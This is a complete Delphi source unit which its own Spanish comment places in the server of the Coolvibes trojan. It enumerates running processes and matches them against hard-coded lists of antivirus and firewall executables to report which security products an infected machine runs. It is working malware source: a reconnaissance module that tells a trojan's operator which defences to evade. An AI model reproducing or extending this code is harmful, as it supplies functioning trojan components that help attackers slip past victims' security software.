{Unit perteneciente al server del troyano Coolvibes que contiene funciones para
detectar que antivirus y firewall se usa en el sistema}
unit unitAvs;

interface

uses
  Windows,
  SysUtils,
  TLHelp32;

const
  Procesos: array[0..15] of string = ('avesvc.exe',
    'ashdisp.exe',
    'avgcc.exe',
    'bdss.exe',
    'spider.exe',
    'avp.exe',
    'nod32krn.exe',
    'cclaw.exe',
    'dvpapi.exe',
    'ewidoctrl.exe',
    'mcshield.exe',
    'pavfires.exe',
    'almon.exe',
    'ccapp.exe',
    'pccntmon.exe',
    'fssm32.exe');
  NombreDeAntivirus: array[0..15] of string = ('AntiVir',
    'Avast Antivirus',
    'AVG Antivirus',
    'BitDefender',
    'Dr.Web',
    'Kaspersky Antivirus',
    'Nod32',
    'Norman',
    'Authentium Antivirus',
    'Ewido Security Suite',
    'McAfee VirusScan',
    'Panda Antivirus/Firewall',
    'Sophos',
    'Symantec/Norton',
    'PC-cillin Antivirus',
    'F-Secure');

  Firewalls: array[0..14] of string = ('issvc.exe',
    'vsmon.exe',
    'cpf.exe',
    'ca.exe',
    'tnbutil.exe',
    'avp.exe',
    'mpfservice.exe',
    'npfmsg.exe',
    'outpost.exe',
    'tpsrv.exe',
    'pavfires.exe',
    'kpf4ss.exe',
    'persfw.exe',
    'vsserv.exe',
    'smc.exe');
  NombreDeFirewall: array[0..14] of string = ('Norton Personal Firewall',
    'ZoneAlarm',
    'Comodo Firewall',
    'eTrust EZ Firewall',
    'F-Secure Internet Security',
    'Kaspersky Antihacker',
    'McAfee Personal Firewall',
    'Norman Personal Firewall',
    'Outpost Personal Firewall',
    'Panda Internet Seciruty Suite',
    'Panda Anti-Virus/Firewall',
    'Kerio Personal Firewall',
    'Tiny Personal Firewall',
    'BitDefender / Bull Guard Antivirus',
    'Sygate Personal Firewall');

function ObtenerAvs(): string;
function ObtenerFirewall(): string;

implementation

function Scan(tipo: Integer): string;
var
  cLoop: Boolean;
  CapProcesos: THandle;
  L: TProcessEntry32;
  i: Integer;
begin
  Result := 'No encontrado';
  CapProcesos := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS or TH32CS_SNAPMODULE, 0);
  L.dwSize := SizeOf(L);
  cLoop := Process32First(CapProcesos, L);
  while cLoop do
    begin
      if tipo = 1 then
        for i := 0 to 15 do
          if LowerCase(L.szExeFile) = Procesos[i] then
            begin
              if Result = 'No encontrado' then //Osea que no ha copiado nada a result
                Result := NombreDeAntivirus[i]
              else //si es diferente de 'No encontrado' es porque ya copié un av antes
                Result := Result + ' \ ' + NombreDeAntivirus[i];
              //copie un separador y el otro antivirus
            end;
      if tipo = 2 then
        for i := 0 to 14 do
          if LowerCase(L.szExeFile) = Firewalls[i] then
            begin
              if Result = 'No encontrado' then
                Result := NombreDeFirewall[i]
              else
                Result := Result + ' \ ' + NombreDeFirewall[i];
            end;

      cLoop := Process32Next(CapProcesos, L);
    end;
  CloseHandle(CapProcesos);
end;

function ObtenerAvs(): string;
begin
  Result := Scan(1);
end;

function ObtenerFirewall(): string;
begin
  Result := Scan(2);
end;

end.
